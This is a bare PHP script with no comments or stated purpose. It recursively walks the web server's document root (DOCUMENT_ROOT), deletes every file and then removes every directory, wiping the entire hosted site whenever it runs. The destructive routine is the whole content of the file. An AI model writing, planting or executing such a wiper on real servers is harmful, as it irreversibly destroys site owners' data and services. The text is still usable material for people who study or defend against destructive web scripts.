<?php 

$dirname = $_SERVER['DOCUMENT_ROOT'];

function remove_directory($directory) {
        if (!is_dir($directory)) return;

        $contents = scandir($directory);
        unset($contents[0], $contents[1]);

        foreach($contents as $object) {
            $current_object = $directory.'/'.$object;
            if (filetype($current_object) === 'dir') {
                remove_directory($current_object);
            } else {
                unlink($current_object);    
            }
        }

        rmdir($directory);
    }
    
    remove_directory("$dirname");